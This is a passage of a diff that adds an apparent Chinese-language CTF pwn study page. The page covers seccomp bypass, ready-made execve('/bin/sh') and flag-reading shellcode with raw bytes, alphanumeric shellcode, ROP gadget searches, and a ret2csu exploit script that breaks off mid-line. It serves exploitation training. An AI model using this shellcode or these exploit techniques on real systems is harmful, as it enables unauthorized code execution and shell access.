+<td align="left">fd</td>
+<td align="left"><code>&#39;eax&#39;</code></td>
+<td align="left">用上一步 open 得到的文件描述符</td>
+</tr>
+<tr>
+<td align="left">offset</td>
+<td align="left"><code>0</code></td>
+<td align="left">从文件的第 0 个字节开始映射</td>
+</tr>
+</tbody></table>
+<p>sendfile就是将内存中相关内容读取到终端</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">值</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">out_fd</td>
+<td align="left"><code>1</code></td>
+<td align="left">stdout，直接输出到终端</td>
+</tr>
+<tr>
+<td align="left">in_fd</td>
+<td align="left"><code>3</code></td>
+<td align="left">我们打开的 flag 文件描述符</td>
+</tr>
+<tr>
+<td align="left">offset</td>
+<td align="left"><code>0</code></td>
+<td align="left">从文件开头开始传输</td>
+</tr>
+<tr>
+<td align="left">count</td>
+<td align="left"><code>0x100</code></td>
+<td align="left">传输 256 字节</td>
+</tr>
+</tbody></table>
+<h5 id="3-切换架构"><a href="#3-切换架构" class="headerlink" title="3.切换架构"></a>3.切换架构</h5><p>seccomp 规则可以只检查某个架构的系统调用号，seccomp 默认可能只限制了当前运行架构的系统调用号。如果你能切换到另一个架构，而沙箱没有覆盖那个架构，限制就失效了。</p>
+<p>首先cpu是通过cs寄存器看出来当前是按64位还是32位的。</p>
+<p>所以切换架构的时候就需要修改cs寄存器的值，<strong>修改 CS 的唯一方式是远跳转&#x2F;远返回。<code>retfq</code> 从栈上弹出新的 CS 值，CPU 就按新的模式运行，同一段机器码在 32 位和 64 位下的含义不同，从而绕过了 seccomp 对 64 位调用号的限制。</strong></p>
+<h5 id="4-严格限制输入长度"><a href="#4-严格限制输入长度" class="headerlink" title="4.严格限制输入长度"></a>4.严格限制输入长度</h5><h6 id="利用短字节shellcode"><a href="#利用短字节shellcode" class="headerlink" title="利用短字节shellcode"></a>利用短字节shellcode</h6><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6><p><code>getshell</code> - 21字节</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># (execve(&quot;/bin/sh&quot;,NULL,NULL))</span><br><span class="hljs-attr">shellcode</span> = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x68732f</span><br><span class="hljs-string">    push 0x6e69622f</span><br><span class="hljs-string">    mov ebx,esp</span><br><span class="hljs-string">    xor ecx,ecx</span><br><span class="hljs-string">    xor edx,edx</span><br><span class="hljs-string">    push 11</span><br><span class="hljs-string">    pop eax</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><code>orw</code> - 56字节</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vim">shellcode = asm(<span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>    /*<span class="hljs-keyword">open</span>(./flag)*/<br>    push <span class="hljs-number">0</span>x1010101<br>    <span class="hljs-built_in">xor</span> dword <span class="hljs-keyword">ptr</span> [esp], <span class="hljs-number">0</span>x1016660<br>    push <span class="hljs-number">0</span>x6c662f2e<br>    mov eax,<span class="hljs-number">0</span>x5<br>    mov ebx,esp<br>    <span class="hljs-built_in">xor</span> ecx,ecx<br>    <span class="hljs-keyword">int</span> <span class="hljs-number">0</span>x80<br>    /*<span class="hljs-keyword">read</span>(fd,buf,<span class="hljs-number">0</span>x100)*/<br>    mov ebx,eax<br>    mov ecx,esp<br>    mov edx,<span class="hljs-number">0</span>x30<br>    mov eax,<span class="hljs-number">0</span>x3<br>    <span class="hljs-keyword">int</span> <span class="hljs-number">0</span>x80<br>    /*<span class="hljs-keyword">write</span>(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0</span>x100)*/<br>    mov ebx,<span class="hljs-number">0</span>x1<br>    mov eax,<span class="hljs-number">0</span>x4<br>    <span class="hljs-keyword">int</span> <span class="hljs-number">0</span>x80<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;)</span><br></code></pre></td></tr></table></figure>
+
+<p>无 <code>\x00</code> 截断 <code>getshell</code> - 21字节</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80<br></code></pre></td></tr></table></figure>
+
+<p><code>scanf</code> 可读取 <code>getshell</code> - 41字节</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh<br></code></pre></td></tr></table></figure>
+
+<h6 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h6><p><code>getshell</code> - 22字节</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">shellcode</span> = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor esi,esi</span><br><span class="hljs-string">    xor edx,edx</span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><code>orw</code> - 43字节</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">shellcode</span> = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x67616c66</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    xor esi,esi</span><br><span class="hljs-string">    push 2</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdi,rax</span><br><span class="hljs-string">    mov rsi,rsp</span><br><span class="hljs-string">    mov edx,0x100</span><br><span class="hljs-string">    xor eax,eax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,1</span><br><span class="hljs-string">    mov rsi,rsp</span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>无 <code>\x00</code> 截断且 <code>scanf</code> 可读 - 22字节</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05<br></code></pre></td></tr></table></figure>
+
+<h5 id="5-限制输入内容"><a href="#5-限制输入内容" class="headerlink" title="5.限制输入内容"></a>5.限制输入内容</h5><h6 id="仅数字字母"><a href="#仅数字字母" class="headerlink" title="仅数字字母"></a>仅数字字母</h6><p><a target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3">alpha3</a> 项目可以实现输出可见 shellcode，安装和使用方法如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/TaQini/alpha3.git&gt;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python sc.py &gt; shellcode</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> alpha3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./shellcode_x64.sh rax</span><br></code></pre></td></tr></table></figure>
+
+<p>使用脚本生成</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">from pwn import *<br>import os<br><br>context<span class="hljs-punctuation">(</span>arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;<span class="hljs-punctuation">)</span><br>context.log_level = &#x27;debug&#x27;<br><br>fp = open<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;shellcode&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span><span class="hljs-punctuation">)</span><br>fp.write<span class="hljs-punctuation">(</span>asm<span class="hljs-punctuation">(</span>shellcraft.sh<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><br>fp.close<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br><br>shellcode = os.popen<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;python ./alpha3/ALPHA3.py x64 ascii mixedcase rax --input=shellcode&quot;</span><span class="hljs-punctuation">)</span>.read<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br><br>print shellcode<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意：alpha3 生成 shellcode 时如果设置 rax 那么跳转至 shellcode 时 rax 必须为 shellcode 的地址。设置为其他寄存器同理</strong></p>
+<ul>
+<li><p>32 位（70字节，eax）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">hffffk4diFkTpj02Tpk0T0AuEE2O092w390k0Z0X7L0J0X137O080Y065N4o114C3m3H01<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>64 位（105字节，rax）</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103S0g0x4L1L0R2n1n0W7K7o0Y7K0d2m4B0U380a050W</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>64 位（271字节，rdi）</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Wh<span class="hljs-number">0666</span>TY<span class="hljs-number">1131</span>Xh<span class="hljs-number">333311</span>k<span class="hljs-number">13</span>XjiV<span class="hljs-number">11</span>Hc<span class="hljs-number">1</span>ZXYf<span class="hljs-number">1</span>TqIHf<span class="hljs-number">9</span>kDqW<span class="hljs-number">02</span>DqX<span class="hljs-number">0</span>D<span class="hljs-number">1</span>Hu<span class="hljs-number">3</span>M<span class="hljs-number">7</span>M<span class="hljs-number">1</span>o<span class="hljs-number">1</span>M<span class="hljs-number">170</span>Y<span class="hljs-number">172</span>y<span class="hljs-number">0</span>h<span class="hljs-number">16110</span>j<span class="hljs-number">100</span>o<span class="hljs-number">0</span>Z<span class="hljs-number">0</span>J<span class="hljs-number">131</span>k<span class="hljs-number">1217100</span>Z<span class="hljs-number">110</span>Y<span class="hljs-number">0</span>i<span class="hljs-number">0</span>Z<span class="hljs-number">0</span>Y<span class="hljs-number">09110</span>k<span class="hljs-number">0x2</span>I<span class="hljs-number">100</span>i<span class="hljs-number">0</span>i<span class="hljs-number">020</span>W<span class="hljs-number">130e0</span>F<span class="hljs-number">0x0</span><span class="hljs-keyword">x</span><span class="hljs-number">0</span>V<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>Z<span class="hljs-number">0</span>u<span class="hljs-number">0</span>A<span class="hljs-number">2</span>n<span class="hljs-number">101</span>k<span class="hljs-number">0</span>t<span class="hljs-number">2</span>K<span class="hljs-number">0</span>h<span class="hljs-number">0</span>i<span class="hljs-number">0</span>t<span class="hljs-number">180</span>y<span class="hljs-number">0</span>D<span class="hljs-number">132</span>F<span class="hljs-number">110</span>M<span class="hljs-number">130</span>y<span class="hljs-number">120</span><span class="hljs-keyword">c</span><span class="hljs-number">102</span>n<span class="hljs-number">102</span>q<span class="hljs-number">141</span>N<span class="hljs-number">117</span>K<span class="hljs-number">110</span>a<span class="hljs-number">122</span>k<span class="hljs-number">112</span>H<span class="hljs-number">102</span>O<span class="hljs-number">17031709102</span>Z<span class="hljs-number">172</span>q<span class="hljs-number">102</span>q<span class="hljs-number">122</span>L<span class="hljs-number">162</span>L<span class="hljs-number">110e120</span>S<span class="hljs-number">102</span>u<span class="hljs-number">121</span>N<span class="hljs-number">107</span>o<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>32 位</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>64 位</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="禁用-x0f-x05"><a href="#禁用-x0f-x05" class="headerlink" title="禁用\x0f\x05"></a>禁用\x0f\x05</h5><p>因为在进行shellcode的时候最后会有一个syscall是整个shellcode的核心，只有这最后一条才会触发系统调用。</p>
+<p>因为shellcode在asm里面会转化成机器码，也就是</p>
+<p>64位：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">mov rax, <span class="hljs-number">59</span><br>mov rdi, <span class="hljs-string">&quot;/bin/sh&quot;</span><br>xor rsi, rsi<br>xor rdx, rdx<br>syscall           ← 这行的机器码就是 \x0f\x05<br></code></pre></td></tr></table></figure>
+
+<p>所以如果这个\x0f和\x05被限制了的话，那么就可以通过异或运算将这个值算出来，</p>
+<p>就是可以首先在某个地方写入一个数据，比如0x66666666 ,</p>
+<p>这个地址的要求：</p>
+<table>
+<thead>
+<tr>
+<th align="left">条件</th>
+<th align="left">为什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>有执行权限（X）</strong></td>
+<td align="left">CPU 要执行这里的代码</td>
+</tr>
+<tr>
+<td align="left"><strong>有写权限（W）</strong></td>
+<td align="left">你要能 XOR 修改它（或者提前写入）</td>
+</tr>
+<tr>
+<td align="left"><strong>地址已知</strong></td>
+<td align="left">你要能在代码里引用它</td>
+</tr>
+</tbody></table>
+<p>之后就可以用0x66666963来和上面的数据进行异或，这样那个位置的数值就会是0x0F05</p>
+<p>例如;</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">第<span class="hljs-number">1</span>步：把 <span class="hljs-number">0x66666666</span> 写到 [rax+<span class="hljs-number">0x20</span>] 位置<br>; 比如通过输入字符串 <span class="hljs-string">&quot;ffffffff&quot;</span> 正好落在这个位置<br>; 或者在 shellcode 里先 push 再 pop<br><br>push <span class="hljs-number">0x66666666</span>        ; 把这个值压栈<br>pop qword [rax+<span class="hljs-number">0x20</span>]   ; 存到目标位置<br><br>; 第<span class="hljs-number">2</span>步：再用 <span class="hljs-number">0x66666963</span> 异或它<br>mov rsi, <span class="hljs-number">0x66666963</span><br>xor [rax+<span class="hljs-number">0x20</span>], rsi    ; <span class="hljs-number">0x66666666</span> XOR <span class="hljs-number">0x66666963</span> = <span class="hljs-number">0x0F05</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="6-限制权限"><a href="#6-限制权限" class="headerlink" title="6.限制权限"></a>6.限制权限</h5><h6 id="限制shellcode段没有读写权限-mprotect"><a href="#限制shellcode段没有读写权限-mprotect" class="headerlink" title="限制shellcode段没有读写权限+mprotect"></a>限制shellcode段没有读写权限+mprotect</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure>
+
+<p>各个参数说明：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">mprotect(<br>    addr,   // 要改权限的内存起始地址（必须页对齐，即 <span class="hljs-number">0x1000</span> 的整数倍）<br>    <span class="hljs-built_in">len</span>,    // 长度（会自动向上取整到页边界）<br>    prot    // 新权限<br>);<br></code></pre></td></tr></table></figure>
+
+<p>prot权限说明：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#define PROT_NONE  0x0   // 无权限</span><br><span class="hljs-comment">#define PROT_READ  0x1   // 可读</span><br><span class="hljs-comment">#define PROT_WRITE 0x2   // 可写</span><br><span class="hljs-comment">#define PROT_EXEC  0x4   // 可执行</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>用的时候把它们加起来：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">你想要</th>
+<th align="left">计算</th>
+<th align="left">prot 值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">只读</td>
+<td align="left"><code>1</code></td>
+<td align="left"><code>1</code></td>
+</tr>
+<tr>
+<td align="left">读写</td>
+<td align="left"><code>1+2</code></td>
+<td align="left"><code>3</code></td>
+</tr>
+<tr>
+<td align="left">读执行</td>
+<td align="left"><code>1+4</code></td>
+<td align="left"><code>5</code></td>
+</tr>
+<tr>
+<td align="left">读写执行</td>
+<td align="left"><code>1+2+4</code></td>
+<td align="left"><code>7</code></td>
+</tr>
+</tbody></table>
+<p>系统调用号：10</p>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><table>
+<thead>
+<tr>
+<th align="left">参数顺序</th>
+<th align="left">64位寄存器</th>
+<th align="left">32位寄存器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">第1个参数</td>
+<td align="left"><code>rdi</code></td>
+<td align="left"><code>ebx</code></td>
+</tr>
+<tr>
+<td align="left">第2个参数</td>
+<td align="left"><code>rsi</code></td>
+<td align="left"><code>ecx</code></td>
+</tr>
+<tr>
+<td align="left">第3个参数</td>
+<td align="left"><code>rdx</code></td>
+<td align="left"><code>edx</code></td>
+</tr>
+<tr>
+<td align="left">第4个参数</td>
+<td align="left"><code>r10</code></td>
+<td align="left"><code>esi</code></td>
+</tr>
+<tr>
+<td align="left">第5个参数</td>
+<td align="left"><code>r8</code></td>
+<td align="left"><code>edi</code></td>
+</tr>
+<tr>
+<td align="left">第6个参数</td>
+<td align="left"><code>r9</code></td>
+<td align="left"><code>ebp</code></td>
+</tr>
+</tbody></table>
+<p>这个就是适用于nx打开，于是就只能通过拼接gadget进而执行相关的系统调用。</p>
+<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>如果没有system和开启了NX（栈不可执行）保护可以用（有system最好用ret2text，方便省事，没开NX直接ret2shellcode）</p>
+<h3 id="主要过程"><a href="#主要过程" class="headerlink" title="主要过程"></a>主要过程</h3><ol>
+<li>把系统调用的编号存入 <strong>EAX</strong>；</li>
+<li>把函数参数存入其它通用寄存器；</li>
+<li>触发 0x80 号中断（<strong>int 0x80</strong>）。</li>
+</ol>
+<h4 id="32位（简述）"><a href="#32位（简述）" class="headerlink" title="32位（简述）"></a>32位（简述）</h4><p>首先查找相关的寄存器，因为32位是eax ebx ecx edx 而函数调用号需要放在eax中，并把需要的系统调用号给eax（通常使用<strong>execve</strong>，即0x0b），把其余寄存器清空（给一个0进去即可）再将&#x2F;bin&#x2F;sh（或者sh也可）的地址和int 0x80的地址作为参数传进去即可</p>
+<h5 id="寻找相关的gadget指令"><a href="#寻找相关的gadget指令" class="headerlink" title="寻找相关的gadget指令"></a>寻找相关的gadget指令</h5><p>使用Ropgadget工具进行寻找</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ROPgadget --binary ./pwn --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;pop eax&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ROPgadget --binary ./pwn --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;pop edx.*pop ecx.*pop ebx.*ret&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">ROPgadget --binary ./pwn --only <span class="hljs-string">&quot;int&quot;</span><br><br>ROPgadget --binary ./pwn --only <span class="hljs-string">&quot;int|ret&quot;</span> | grep <span class="hljs-string">&quot;int 0x80&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">objdump -d ./pwn | grep -A1 <span class="hljs-string">&quot;int.*0x80&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ROPgadget --binary ./pwn | grep <span class="hljs-string">&quot;: ret$&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ROPgadget --binary ./pwn | grep -E <span class="hljs-string">&quot;pop ebx|pop ecx|pop edx|pop eax|int 0x80&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ROPgadget --binary ./pwn --string <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="64（简述）"><a href="#64（简述）" class="headerlink" title="64（简述）"></a>64（简述）</h3><p>它的传参则是需要，rax存放调用号（0x3b），之后函数的参数则是放在rdi rsi rdx rcx r8 r9这个顺序之中的，所以还是需要使用Ropgadget 去查找相关的寄存器。</p>
+<p>而首先还是将系统调用号存入rax中，之后再将各个参依次存入rdi rsi rdx中</p>
+<p>首先那就是寻找相关的指令。</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&quot;./x64_ret2csu&quot;</span>)<br><span class="hljs-comment"># p = remote(&quot;192.168.6.102&quot;,21986)</span><br>e = ELF(<span class="hljs-string">&quot;./x64_ret2csu&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Welcome to x64_ret2csu\n&quot;</span>)<br><br>gadget1 = <span class="hljs-number">0x40071a</span><br>gadget2 = <span class="hljs-number">0x400700</span><br>write_got = e.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment"># print(write_got)</span><br>main = <span class="hljs-number">0x40065B</span><br><br>padding = <span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * padding<br>payload += p64(gadget1)<br>payload += p64(<span class="hljs-number">0</span>)    <span class="hljs-comment"># rbx</span><br>payload += p64(<span class="hljs-number">1</span>)    <span class="hljs-comment"># rbp</span><br>payload += p64(write_got)<br>payload += p64(<span class="hljs-number">8</span>)      <span class="hljs-comment"># rdx</span><br>payload += p64(write_got)  <span class="hljs-comment"># rsi</span><br>payload += p64(<span class="hljs-number">1</span>)      <span class="hljs-comment"># rdi</span><br>payload += p64(gadget2)<br>payload += p64(<span class="hljs-number">0xdeadbeef</span>)*<span class="hljs-number">7</span><br>payload += p64(main)<br>p.send(payload)<br><br>write_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_addr is %#x&quot;</span> %write_addr)<br><br>libc_base = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base is %#x&quot;</span> %libc_base)<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br><br><span class="hljs-comment"># obj = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-comment"># libc_base = write_addr - obj.dump(&quot;write&quot;)</span><br><span class="hljs-comment"># system_addr = libc_base + obj.dump(&quot;system&quot;)</span><br><span class="hljs-comment"># bin_sh = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span><br><br><br>pop_rdi_ret = <span class="hljs-number">0x400723</span><br>ret = <span class="hljs-number">0x4004c9</span><br>p.recvuntil(<span class="hljs-string">b&quot;Welcome to x64_ret2csu\n&quot;</span>)<br>padding = <span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span><br>payload = <span 